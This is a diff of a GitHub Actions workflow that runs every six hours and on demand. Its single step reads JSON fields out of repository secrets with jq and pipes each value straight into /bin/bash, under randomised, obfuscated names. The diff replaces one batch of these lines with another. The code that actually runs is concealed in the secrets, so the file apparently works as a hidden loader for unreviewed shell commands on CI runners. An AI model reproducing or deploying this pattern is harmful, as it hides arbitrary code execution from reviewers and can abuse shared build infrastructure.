@@ -1,26 +1,22 @@
 name: estvaisania
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 4/6 * * *'
-jobs:  # 2492
+    - cron: '20 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: estvaisania
         env:
-          b43: ${{ secrets.b43 }}
+          ts2358: ${{ secrets.ts2358 }}
         run: |
-          echo $b43 | jq -r .jb3070 | /bin/bash
-          echo $kbrj0360 | jq -r .ijtbt982 | /bin/bash
-          echo $pqo6246 | jq -r .w031 | /bin/bash
-          echo $hg40 | jq -r .gxgr0136 | /bin/bash
-          echo $nouiw9903 | jq -r .lvenk1 | /bin/bash
-          echo $ehwgm56 | jq -r .ty05 | /bin/bash
-          echo $sekxi8548 | jq -r .dhbv105 | /bin/bash
-          echo $mwrw984 | jq -r .jxwu7 | /bin/bash
-          echo $c0 | jq -r .xrifv344 | /bin/bash
-          echo $ixk66 | jq -r .u8732 | /bin/bash
-          echo $oi3 | jq -r .ak93085 | /bin/bash
+          echo $ts2358 | jq -r .ivo9 | /bin/bash
+          echo $aud73114 | jq -r .a743 | /bin/bash
+          echo $aiat31 | jq -r .rksxu51 | /bin/bash
+          echo $etqu9 | jq -r .g3450 | /bin/bash
+          echo $x521 | jq -r .ix8 | /bin/bash
 
